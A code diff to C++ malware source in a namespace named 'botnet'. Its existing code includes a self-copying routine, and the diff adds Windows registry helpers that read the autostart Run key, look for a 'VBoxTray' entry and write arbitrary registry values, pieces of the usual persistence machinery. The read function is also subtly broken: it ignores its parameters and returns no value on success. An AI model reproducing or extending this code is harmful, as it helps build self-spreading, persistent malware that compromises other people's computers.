@@ -2,6 +2,7 @@
 
 #include <iostream>
 #include <fstream>
+#include <Windows.h>
 
 namespace botnet {
     std::vector<std::string> split(const std::string& str,
@@ -74,6 +75,44 @@ bool copy_it_self(const std::string& dir, const std::string& fname) {
     }
 
     return true;
+}
+
+std::wstring ReadRegValue(HKEY root, std::string key, std::string name)
+{
+    HKEY hkey;
+    WCHAR szBuffer[1024];
+    DWORD dwBufferSize = sizeof(szBuffer);
+    ULONG nError;
+
+    if (RegOpenKeyEx(root, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_READ, &hkey) != ERROR_SUCCESS)
+        return std::wstring();
+
+    nError = RegQueryValueExW(hkey, L"VBoxTray", 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
+
+    if (nError != ERROR_SUCCESS)
+    {
+        RegCloseKey(hkey);
+        return std::wstring();
+    }
+
+    RegCloseKey(hkey);
+
+}
+
+int SetKeyData(HKEY hRootKey, char *subKey, DWORD dwType, char *value, LPBYTE data, DWORD cbData)
+{
+    HKEY hKey;
+    if (RegCreateKey(hRootKey, subKey, &hKey) != ERROR_SUCCESS)
+        return 0;
+
+    if (RegSetValueEx(hKey, value, 0, dwType, data, cbData) != ERROR_SUCCESS)
+    {
+        RegCloseKey(hKey);
+        return 0;
+    }
+
+    RegCloseKey(hKey);
+    return 1;
 }
 
 }
